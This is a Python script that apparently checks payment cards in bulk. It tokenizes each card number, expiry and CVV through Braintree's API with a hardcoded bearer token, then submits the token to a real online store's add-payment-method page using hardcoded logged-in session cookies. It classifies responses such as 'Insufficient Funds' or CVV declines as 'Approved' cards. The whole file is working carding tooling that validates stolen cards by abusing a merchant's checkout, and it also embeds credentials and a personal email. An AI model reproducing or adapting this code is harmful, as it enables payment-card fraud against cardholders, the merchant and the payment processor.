import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]


  headers = {
      'authority': 'payments.braintree-api.com',
      'accept': '*/*',
      'accept-language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5',
      'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzkwNjI0OTIsImp0aSI6IjJlMWMwMWFjLWUxNTctNGNiZi1iY2EzLTA5NzQwNjQ1NDI3NSIsInN1YiI6IjZoY21tOTVzYmR2OG5reDciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZoY21tOTVzYmR2OG5reDciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.yIB6gMv-lv_RTCFsH4z_TWqZ0BA5fYLaQ5IE21cBM8cBaKNKC6O0Gd-K0gbRsIyjnU7CS48fk7MK2NiLr9CnRg',
      'braintree-version': '2018-05-10',
      'cache-control': 'no-cache',
      'content-type': 'application/json',
      'origin': 'https://assets.braintreegateway.com',
      'pragma': 'no-cache',
      'referer': 'https://assets.braintreegateway.com/',
      'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
      'clientSdkMetadata': {
          'source': 'client',
          'integration': 'custom',
          'sessionId': 'ff11d867-e013-47bf-aa92-892694e77ff9',
      },
      'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
      'variables': {
          'input': {
              'creditCard': {
                  'number': n,
                  'expirationMonth': mm,
                  'expirationYear': yy,
                  'cvv': cvc,
              },
              'options': {
                  'validate': False,
              },
          },
      },
      'operationName': 'TokenizeCreditCard',
  }

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok1 = response.json()['data']['tokenizeCreditCard']['token']
# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"782a2535-e5fb-4a87-b7ea-fdac1f7d505e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4937020000740801","expirationMonth":"01","expirationYear":"2027","cvv":"995"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)	

  import requests

  cookies = {
      'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2F',
      '_ga': 'GA1.1.1901522995.1738363263',
      'wordpress_test_cookie': 'WP%20Cookie%20check',
      'mailchimp.cart.current_email': 'yduzhudhdjdh78@gmail.com',
      'mailchimp_user_previous_email': 'yduzhudhdjdh78%40gmail.com',
      'mailchimp_user_email': 'yduzhudhdjdh78%40gmail.com',
      'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': 'yduzhudhdjdh78%7C1740181731%7CnVH854baTCVkZaOz6NpVBM73U73SJkNioDkaQVmDfsE%7C0dec9d55c0997e3774232d5b28a4e0f873e1e1be03f160507762de1d58866cc7',
      'tinv_wishlistkey': '803dd0',
      'tinvwl_wishlists_data_counter': '0',
      '_ga_5BLLY83SK2': 'GS1.1.1738975981.15.1.1738976091.0.0.0',
  }

  headers = {
      'authority': 'www.flexinnovations.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5',
      'cache-control': 'no-cache',
      'content-type': 'application/x-www-form-urlencoded',
      # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.flexinnovations.com%2F; _ga=GA1.1.1901522995.1738363263; wordpress_test_cookie=WP%20Cookie%20check; mailchimp.cart.current_email=yduzhudhdjdh78@gmail.com; mailchimp_user_previous_email=yduzhudhdjdh78%40gmail.com; mailchimp_user_email=yduzhudhdjdh78%40gmail.com; wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a=yduzhudhdjdh78%7C1740181731%7CnVH854baTCVkZaOz6NpVBM73U73SJkNioDkaQVmDfsE%7C0dec9d55c0997e3774232d5b28a4e0f873e1e1be03f160507762de1d58866cc7; tinv_wishlistkey=803dd0; tinvwl_wishlists_data_counter=0; _ga_5BLLY83SK2=GS1.1.1738975981.15.1.1738976091.0.0.0',
      'origin': 'https://www.flexinnovations.com',
      'pragma': 'no-cache',
      'referer': 'https://www.flexinnovations.com/my-account/add-payment-method/',
      'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
  }

  data = [
      ('payment_method', 'braintree_credit_card'),
      ('wc-braintree-credit-card-card-type', 'visa'),
      ('wc-braintree-credit-card-3d-secure-enabled', ''),
      ('wc-braintree-credit-card-3d-secure-verified', ''),
      ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
      ('wc_braintree_credit_card_payment_nonce', tok1),
      ('wc_braintree_device_data', '{"correlation_id":"91c30e41b96bd00cebb58ef1141c7817"}'),
      ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
      ('wc_braintree_paypal_payment_nonce', ''),
      ('wc_braintree_device_data', '{"correlation_id":"91c30e41b96bd00cebb58ef1141c7817"}'),
      ('wc_braintree_paypal_amount', '0.00'),
      ('wc_braintree_paypal_currency', 'USD'),
      ('wc_braintree_paypal_locale', 'en_us'),
      ('wc-braintree-paypal-tokenize-payment-method', 'true'),
      ('woocommerce-add-payment-method-nonce', 'd31754bf07'),
      ('_wp_http_referer', '/my-account/add-payment-method/'),
      ('woocommerce_add_payment_method', '1'),
  ]


  response = requests.post(
      'https://www.flexinnovations.com/my-account/add-payment-method/',
      cookies=cookies,
      headers=headers,
      data=data,
  )
  text = response.text
  pattern = r'Status code \d+: (.+?)\s*</li>'
  match = re.search(pattern, text)

  if match:
      result = match.group(1)
  else:
      if 'Payment method successfully added.' in text:
          result = "1000: Approved"
      elif 'risk_threshold' in text:
          result = "RISK: Retry this BIN later."
      elif 'Please wait for 20 seconds.' in text:
          result = "try again"
      else:
          result = "Error"
          print('er#')

  # إضافة شرط جديد
  if 'Status code avs: Gateway Rejected: avs' in text:
      result = "1000: Approved"

  # إذا وجد "Card Issuer Declined CVV" يتم إرجاع "Approved ccn"
  if 'Card Issuer Declined CVV' in text:
      result = "Approved ccn"

  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
      return 'Approved'
  elif result == "Approved ccn":
      return "Approved ccn"
  else:
      return result

  def sq(card):
      return 'ابقي غطيها كويس لما تيجي تنام'
